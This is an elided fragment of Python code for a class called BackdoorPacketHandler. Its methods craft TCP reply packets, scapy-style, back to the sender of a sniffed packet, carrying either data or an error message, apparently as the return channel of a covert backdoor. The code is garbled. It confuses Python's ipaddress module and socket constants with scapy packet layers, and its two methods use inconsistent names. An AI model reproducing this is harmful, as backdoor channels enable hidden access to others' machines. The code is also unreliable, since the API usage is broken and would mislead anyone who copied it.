...
import ipaddress
from socket import TCP_CONNECTION_INFO, TCP_INFO
...
class BackdoorPacketHandler:
	...
	def send_response(self, packet, data):
		...
		"""
		response_packet = ipaddress(dst=packet[ip_interface].src) / TCP(dport=consts.SENDING_PORT, sport=packet.dport, ack=packet[TCP].seq+1, seq=packet[TCP].ack, flags=consts.SENDING_FLAG_VALUE) / bytes(data)
	...
	def send_error_response(self, packet):
		...
		:param: packet is the scapy sniffed packet
		"""
		response_packet = ip_address(dst=packet[ip_network].src) / TCP(dport=consts.SENDING_PORT, sport=packet.dport, ack=packet[TCP].seq+1, seq=packet[TCP].ack, flags=consts.SENDING_FLAG_VALUE) / consts.ERR_MSG
		send(response_packet)